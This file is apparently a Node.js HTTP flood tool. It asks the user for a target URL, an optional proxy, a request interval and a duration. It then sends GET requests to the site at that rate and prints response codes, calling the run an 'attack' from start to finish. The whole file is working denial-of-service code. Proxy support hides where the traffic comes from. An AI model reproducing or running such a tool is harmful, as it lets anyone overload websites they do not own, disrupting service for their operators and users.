const prompt = require('prompt-sync')({sigint: true}) 
const {HttpsProxyAgent} = require("https-proxy-agent")
const fs = require("fs")

function cs(color) {
    const colors = {
        reset: "0",
        black: "90",
        red: "91",
        green: "92",
        magenta: "95",
        yellow: "93",
        blue: "94"
    } 
    return "\x1b[" + (colors?.[color] ?? "0") + "m" 
}

function nl() {
    console.log()
}

process.stdout.write('\u001b[2J\u001b[H')  

const start = (async() => {
    const interval = parseInt( prompt(`${cs("red")}Set interval (default: 20) ${cs("green")} `))  || 20
    console.log(`${cs("magenta")}${interval}${cs("reset")}`)

    const sitePrompt = prompt(`${cs("red")}Set site ${cs("green")}`)
    const site = `${sitePrompt.startsWith("https://") ? "" : "https://"}${sitePrompt}${sitePrompt.endsWith("/") ? "" : "/"}`
    console.log(`${cs("magenta")}${site}${cs("reset")}`)

    const proxyPrompt = prompt(`${cs("red")}Set proxy, include port (default: None) ${cs("green")}`) || null
    const proxy = proxyPrompt ? `${proxyPrompt.startsWith("http://") ? "" : "http://"}${proxyPrompt}` : null
    console.log(`${cs("magenta")}${proxy ? proxy : "None"}${cs("yellow")}${proxy ? " ! PROXY MAY NOT WORK !" : ""}`)

    const length = parseFloat(prompt(`${cs("red")}Set length in seconds (default: 60)${cs("green")} `)) || 60

    if ((prompt(`${cs("red")}! ARE YOU SURE YOU WANT TO CONTINUE? !${cs("green")} `) || "yes") !== "yes") {
        console.log(cs("reset"))
        process.exit(0)
    }

    

    console.clear()
    console.log(`${cs("yellow")}! TESTING SITE AND PROXY ! ${cs("reset")}`)

    nl()
    
    let testRes

    try {
        testRes = await fetch(site, proxy ? { agent: new HttpsProxyAgent(proxy), signal: AbortSignal.timeout(9999999) } : {signal: AbortSignal.timeout(9999999)})
    } catch(e) {
        console.log(`${cs("red")}! FATAL FETCH ERROR, CHECK CONF: ${e} !${cs("reset")}`)
        process.exit(1)
    }
    

    if (!testRes.ok) {
        console.log(`${cs("red")}! SITE RETURNED NON-OK STATUS CODE: ${testRes.status} !\n`)
        if ((prompt(`${cs("red")}Continue with attack? `) || "yes") !== "yes") {
            console.log(cs("reset"))
            process.exit(0)
        }
    }

    const text = await testRes.text()
    fs.writeFileSync("./test-response.txt", text)
    console.log(`${cs("green")}GET ${cs("magenta")}${site} ${cs("yellow")}${testRes.status} ${testRes.statusText} ${cs("red")}Proxy: ${proxy ? proxy : "None"}\n\n${cs("blue")}${text.slice(0,100)}...\n\n`)
    
    console.log(`${cs("green")}! Starting attack...`)
    console.log("Stop at any moment with Ctrl+C.")
    setTimeout(()=>{
        console.clear()
        const startTime = Date.now()
        let requests = 0
        const pendingRequests = new Set()

        const stats = {}

        const newInterval = setInterval(() => {
        const fetchStart = Date.now()
        const fetchPromise = fetch(site, proxy ? { agent: new HttpsProxyAgent(proxy) } : {})
            .then(res => {
                requests += 1
                const lapsed = Date.now() - fetchStart
                const seconds = Math.floor((Date.now() - startTime) / 1000)
                const minutes = Math.floor(seconds / 60) 
                const remainingSeconds = seconds % 60 
                const timeString = `${minutes}:${remainingSeconds.toString().padStart(2, "0")}` 

                console.log(`${res.ok ? cs("reset") : cs("red")}${res.status}${cs("reset")}, ${timeString}, ${requests} requests, ${lapsed}ms`)

                stats[res.status] = (stats[res.status] ?? 0) + 1

                return res 
            })
            .catch(err => {
                const lapsed = Date.now() - fetchStart 
                console.error(`${cs("red")}Fetch error:`, err?.code ?? err.message ?? err, `— ${lapsed}ms${cs("reset")}`) 
                return null 
            })
            .finally(() => {
                pendingRequests.delete(fetchPromise) 
            }) 

        pendingRequests.add(fetchPromise) 
        }, interval) 


        setTimeout(async () => {
            try {
                clearInterval(newInterval) 
                const snapshot = Array.from(pendingRequests) 
                await Promise.allSettled(snapshot)

                const statsText = Object.entries(stats).map(([status, count]) => `${cs("green")}Code ${status === "200" ? "" : cs("red")}${status}${cs("reset")}: ${cs("yellow")}${count} requests`).join("\n");

                console.log(`${cs("green")}Attack complete!\n${requests} requests in ${length} seconds.\n${statsText}${cs("reset")}`) 
            } catch (err) {
                console.error("Finalization error:", err) 
            }
        }, length * 1000) 
        
    }, 3500)
})

try {
    start()
} catch (e) {
    console.log(`${cs("red")} FATAL ERROR OCCURED: \n${cs(reset)}${c}`)
}